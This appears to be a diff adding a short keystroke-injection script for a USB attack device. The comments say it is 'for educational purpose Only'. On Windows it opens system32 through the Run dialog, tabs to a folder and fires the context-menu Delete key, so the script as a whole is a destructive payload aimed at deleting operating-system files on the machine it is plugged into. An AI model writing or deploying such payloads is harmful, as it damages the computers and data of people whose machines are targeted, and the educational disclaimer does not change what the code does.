@@ -1,0 +1,30 @@
+REM Author: Paren76
+REM *************
+REM This is for educational purpose Only
+REM *************
+REM
+REM Start
+DELAY 2000
+ALT F4
+GUI r
+DELAY 500
+STRING system32
+REM Tabbing into folders
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+REM Go to first folder
+DOWNARROW
+UPARROW
+REM Start deleting
+SHIFT F10
+DELETE
+DELAY 60000
+ALT F4
+ALT F4
